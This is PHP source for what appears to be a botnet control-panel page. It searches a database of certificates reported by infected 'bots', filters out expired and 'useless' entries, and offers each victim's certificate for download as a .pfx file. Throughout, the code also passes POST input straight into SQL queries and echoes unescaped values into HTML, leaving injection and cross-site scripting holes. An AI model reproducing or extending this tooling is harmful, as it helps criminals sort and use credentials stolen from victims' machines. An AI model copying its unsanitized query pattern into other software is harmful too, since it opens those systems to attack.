<?

$bot_guid = $_POST['bot_guid'];
$certdatestart = $_POST['certdatestart'];
$certdateend = $_POST['certdateend'];
$data = $_POST['data'];
$limit = $_POST['limit'];
$showUseless = $_POST['showUseless'];

if (strlen($certdatestart) && strlen($certdateend)) {
	list($day, $month, $year) = split('[ :\/.-]', $certdatestart);
	$tstamp0 = "$year-$month-$day 00:00:00";
	list($day, $month, $year) = split('[ :\/.-]', $certdateend);
	$tstamp1 = gmmktime (0, 0, 0, $month, $day + 1, $year);
	$tstamp1 = gmdate('Y-m-d H:i:s', $tstamp1);
	$sqlp1 = " AND (UNIX_TIMESTAMP( cert.date_rep ) >= UNIX_TIMESTAMP('$tstamp0') AND UNIX_TIMESTAMP( cert.date_rep ) < UNIX_TIMESTAMP('$tstamp1'))";
}
if (strlen($bot_guid))
	$sqlp2 = " AND cert.bot_guid LIKE '%$bot_guid%'";
if (strlen($data)) {
	if ( strpos($data, '*') !== false ) {
		$data = str_replace( '*', '%', $data );
	}
	if ($data{0} != '%')
		$data = '%' . $data;
	if ($data{ strlen($data) - 1 } != '%')
		$data .= '%';
	
	$sqlp3 = " AND cert.name LIKE '$data'";
}
if ($showUseless != true) {
	$sqlp4 = " AND (UCASE(cert.name) <> UCASE(LEFT(bot_guid, INSTR(bot_guid, '!') - 1)))";
	$sqlp4 .= " AND (cert.notbefore <= NOW() AND NOW() <= cert.notafter)";
}
if (strlen($limit)) {
	$sqlp5 = " LIMIT $limit";
}

$sql = 'SELECT id, bot_guid, name, data, crc32, date_rep, LENGTH(data), notbefore, notafter'
	 . "  FROM cert"
	 . ' WHERE TRUE'
	 . $sqlp1
	 . $sqlp2
	 . $sqlp3
	 . $sqlp4
	 . $sqlp5;
echo "<!--$sql-->";
?>


<?
require_once 'mod_file.php';
require_once 'mod_time.php';
require_once 'mod_dbase.php';
require_once 'mod_strenc.php';

$dbase = db_open();

$res = mysqli_query($dbase, $sql);
if (!(@($res))) {
	writelog("error.log", "Wrong query : \" $sql \"");
	db_close($dbase);
	exit;
}

if ( mysqli_num_rows($res) == 0) {
	echo "<font class='error'><b>Not found</b></font>";
	db_close($dbase);
	exit;
}

echo "<table width='730' border='1' cellspacing='0' cellpadding='3' style='border: 1px solid #BBBBBB; font-size: 9px; border-collapse: collapse; background-color: #4992a7;'>";

echo "<th style=' color: #EEEEEE;'>id</th>";
echo "<th style=' color: #EEEEEE;'>bot_guid</th>";
echo "<th style=' color: #EEEEEE;'>date_rep</th>";

while ( list($id, $bot_guid, $name, $data, $crc32, $date_rep, $ln, $notbefore, $notafter) = mysqli_fetch_row($res) ) {
	// ~~~
	//$botpc_user = substr($bot_guid, 0, strpos($bot_guid, '!'));
	//if ( $showUseless != true && strcmp($botpc_user, $name) == 0 )
	//	continue;
	// ~~~

	echo "<tr><td colspan='3'></td></tr>";
	
	list($year, $month, $day) = split('[ :\/.-]', $notbefore);
	$nbefore = gmmktime (0, 0, 0, $month, $day, $year);
	list($year, $month, $day) = split('[ :\/.-]', $notafter);
	$nafter = gmmktime (0, 0, 0, $month, $day, $year);
	$bgcolor = '#cce7ef';
	$subtext = '';
	$title = '';
	if ($nbefore != $nafter) {
		if ( (gmmktime() > $nbefore && gmmktime() < $nafter) || strlen($nafter) == 0 )
			$bgcolor = 'rgb(180, 245, 180)';
		else {
			$bgcolor = 'rgb(245, 180, 180)';
			$title = 'expired';
		}
		$subtext = "[ $notbefore - $notafter ]";
	}
	
	echo "<tr align='center' valign='middle' style=' background-color: $bgcolor; ' title='$title'>";
	
	$ucodebot = urlencode($bot_guid);
	// onclick=\"GB_show('Detail info for selected bot', '../../frm_bot.php?guid=$ucodebot', 300, 600); return false;\"
	echo "<td><a href='frm_bot.php?guid=$ucodebot' target='_blank'><img border='0' src='img/info.png' title='$id'></a></td>";
	echo "<td>$bot_guid</td>";
	echo "<td>$date_rep</td>";
	
	echo '</tr>';
	
	$data = $name;
	
	echo "<tr style=' background-color: #cce7ef; '>";
	
	echo "<td colspan='3' style='background-color: #e7f2f6'>";
	/* ~~ */ echo '<table><tr>';
	echo "<td valign='center'>";
	$ln = round($ln / 1024, 2);
	echo "<a href='mod_savecert.php?id=$id' target='_blank'><img border='0' src='img/cert_24px.png' title='[ $ln KB ] : Save this certificate (*.pfx)'></a>";
	echo "</td>";
	echo "<td valign='center'>";
	echo "<b>$subtext   $data</b>";
	echo "</td>";
	/* ~~ */ echo '</tr></table>';
	echo "</td>";
	
	echo '</tr>';
}
db_close($dbase);

echo "</table>";

?>
